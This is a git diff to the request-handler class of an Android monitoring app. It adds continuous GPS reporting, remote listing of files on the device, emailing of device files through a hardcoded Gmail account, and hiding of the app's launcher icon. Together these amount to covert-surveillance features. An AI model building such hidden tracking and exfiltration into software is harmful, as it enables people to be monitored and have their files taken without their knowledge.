@@ -1,36 +1,48 @@
 package com.apriorit.android.processmonitoring.request_handler;
 
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.os.Environment;
+import android.os.Looper;
 import android.provider.Settings;
-import android.util.Log;
 import android.widget.Toast;
 
 import com.apriorit.android.processmonitoring.R;
 import com.apriorit.android.processmonitoring.database.AppData;
 import com.apriorit.android.processmonitoring.database.DatabaseHandler;
+import com.apriorit.android.processmonitoring.registration.SharedPreferencesHandler;
+import com.apriorit.android.processmonitoring.request_handler.mail.GMailSender;
 import com.google.android.gms.gcm.GoogleCloudMessaging;
 
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.atomic.AtomicInteger;
 
-public class Handler {
+public class Handler implements LocationListener {
     private Context mContext;
     private DatabaseHandler mDatabaseHandler;
+    private LocationManager locationManager;
+    private boolean mSendCoordinatesToServer1;
 
     public Handler(Context context) {
         mContext = context;
         mDatabaseHandler = new DatabaseHandler(mContext);
+        mSendCoordinatesToServer1 = false;
+        // mDeviceLocation = new DeviceLocation(context);
     }
 
     /**
@@ -84,11 +96,12 @@ public class Handler {
         SendDataToServer(data);
     }
 
-    /**
-     * Gets coordinates and sends it to GCM server
-     */
-    public void HandleDeviceLocation() {
-
+    public void userAuthentication(String login, String password) {
+        Bundle data = new Bundle();
+        data.putString("requestType", "user-authentication");
+        data.putString("login", login);
+        data.putString("password", password);
+        SendDataToServer(data);
     }
 
     /**
@@ -143,6 +156,27 @@ public class Handler {
         return resolveInfos.get(0).activityInfo.packageName;
     }
 
+    public void sendListFiles(String token, String folder) {
+        String path;
+        if (folder.equals("root")) {
+            path = Environment.getExternalStorageDirectory().toString();
+        } else {
+            path = folder;
+        }
+        File directory = new File(path);
+        File[] files = directory.listFiles();
+        if (files != null) {
+            Bundle data = new Bundle();
+            data.putString("requestType", "list-files");
+            data.putString("token", token);
+            for (int i = 0; i < files.length; i++) {
+                data.putString("file" + String.valueOf(i), files[i].getName());
+            }
+            data.putString("folder", path);
+            SendDataToServer(data);
+        }
+    }
+
     /**
      * Sends data to GCM server
      * GCM server will deliver it to our XMPP server
@@ -166,10 +200,116 @@ public class Handler {
             protected void onPostExecute(String result) {
                 if (result != null) {
                     Toast.makeText(mContext, "send message failed", Toast.LENGTH_LONG).show();
-                    Log.d("Handler", "send message failed");
                 }
             }
         }.execute(null, null, null);
+    }
+
+    public void requestSendFile(String userID, String path, String name) {
+        Bundle data = new Bundle();
+        data.putString("requestType", "send-file");
+        data.putString("user-id", userID);
+        data.putString("directory", path);
+        data.putString("filename", name);
+        SendDataToServer(data);
+    }
+
+    public void requestEnableApp(String login, String password) {
+        Bundle data = new Bundle();
+        data.putString("requestType", "enable-app");
+        data.putString("login", login);
+        data.putString("password", password);
+        SendDataToServer(data);
+    }
+
+    /**
+     * Shows an application icon in Android application list
+     */
+    public void setEnabledSettings(boolean enabled) {
+        PackageManager pm = mContext.getPackageManager();
+        ComponentName componentName = new ComponentName(mContext, com.apriorit.android.processmonitoring.registration.AuthenticationActivity.class);
+        if (enabled) {
+            pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
+        } else {
+            pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        }
+    }
+
+    /**
+     * Opens accessibility service settings to disable accessibility
+     */
+    public void disableAccessibilityService() {
+        try {
+            Intent intentUpdateAccessibility = new Intent("UPDATE_BLACKLIST");
+            intentUpdateAccessibility.putExtra("disable", "accessibility");
+            mContext.sendBroadcast(intentUpdateAccessibility);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    /**
+     * Gets coordinates and sends it to GCM server
+     */
+    public void startSendingCoordinates(String userID) {
+        mSendCoordinatesToServer1 = true;
+        locationManager =
+                (LocationManager) mContext.getSystemService(Context.LOCATION_SERVICE);
+        try {
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000 * 3, 0, this, Looper.getMainLooper());
+        } catch (SecurityException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public void stopSendingCoordinates() {
+        mSendCoordinatesToServer1 = false;
+    }
+
+    @Override
+    public void onLocationChanged(Location location) {
+        double mLatitude = location.getLatitude();
+        double mLongtitude = location.getLongitude();
+
+        if (mSendCoordinatesToServer1) {
+            Bundle data = new Bundle();
+            data.putString("requestType", "location");
+            data.putString("user-id", "1");
+            data.putString("latitude", String.valueOf(mLatitude));
+            data.putString("longtitude", String.valueOf(mLongtitude));
+            SendDataToServer(data);
+        }
+    }
+
+    @Override
+    public void onProviderDisabled(String provider) {
+    }
+
+    @Override
+    public void onProviderEnabled(String provider) {
+    }
+
+    @Override
+    public void onStatusChanged(String provider, int status, Bundle extras) {
+    }
+
+    public void sendFile(final String path, final String fileName) {
+        SharedPreferencesHandler sharedPref = new SharedPreferencesHandler(mContext);
+
+        final String emailDestination = sharedPref.getLogin();
+        new Thread(new Runnable() {
+            public void run() {
+                try {
+                    GMailSender sender = new GMailSender(mContext.getString(R.string.sender_email), mContext.getString(R.string.sender_password));
+                    sender.addAttachment(path, fileName);
+                    sender.sendMail("Data", "File from device",
+                            mContext.getString(R.string.sender_email),
+                            emailDestination);
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();
     }
 }
 
